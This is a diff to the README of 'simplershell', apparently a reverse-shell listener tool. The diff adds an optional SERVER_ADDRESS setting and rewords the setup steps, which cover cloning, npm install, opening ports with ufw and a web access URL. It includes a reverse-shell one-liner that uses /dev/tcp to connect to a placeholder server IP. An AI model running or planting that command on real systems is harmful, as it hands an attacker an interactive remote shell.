@@ -38,10 +38,12 @@ Example command to spawn a shell:
 ```sh
 git clone https://github.com/Eteckq/simplershell.git;
 npm i;
-PORT_HTTP=5555 PORT_TCP=6666 node index.js
+PORT_HTTP=5555 PORT_TCP=6666 SERVER_ADDRESS=YOUR_SERVER_ADDRESS node index.js
 ```
 
-You need to allow configured port (5555 & 6666 here)
+Env var ```SERVER_ADDRESS``` is facultative
+
+Then, you need to allow configured port (5555 & 6666 here)
 
 (with ufw)
 ```
@@ -50,7 +52,7 @@ sudo ufw allow 5555,6666
 
 And access it with http://YOUR_SERVER_IP:5555
 
-Spawn a shell with
+You can test your deployement by spawning a shell:
 ```
 sh -i >& /dev/tcp/YOUR_SERVER_IP/6666 0>&
 ```
